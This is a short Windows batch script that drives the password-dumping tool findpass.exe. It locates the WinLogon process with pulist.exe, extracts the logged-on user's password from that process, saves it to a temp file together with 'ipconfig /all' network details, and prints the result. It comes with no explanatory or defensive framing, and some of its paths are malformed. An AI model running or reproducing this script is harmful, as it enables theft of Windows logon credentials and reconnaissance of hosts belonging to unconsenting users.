@rem ver 1.0 
@if NOT exist %windir%system32findpass.exe echo "ERROR: dont find findpass.exe" 
@if NOT exist %windir%system32pulist.exe echo "ERROR: dont find pulist.exe" 
@echo start.... 
@echo ____________________________________ 
@if "%1"=="" goto USAGE 
@findpass.exe %1 %2 %3 >> %temp%_findpass.txt 
@echo "prog exit code [%errorlevel%] findpass.exe" 
@type %temp%_findpass.txt 
@echo ________________________________Here__pass¡ï¡ï¡ï¡ï¡ï¡ï¡ï¡ï 
@ipconfig /all >>%temp%_findpass.txt 
@goto END

:USAGE 
@pulist.exe >%temp%_pass.txt 
@findstr.exe /i "WINLOGON explorer internat" %temp%_pass.txt 
@echo "Example: fpass.bat %1 %2 %3 %4 !!!" 
@echo "Usage: findpass.exe DomainName UserName PID-of-WinLogon"

:END 
@echo " fpass.bat %COMPUTERNAME% %USERNAME% administrator " 
@echo " fpass.bat end [%errorlevel%] !" 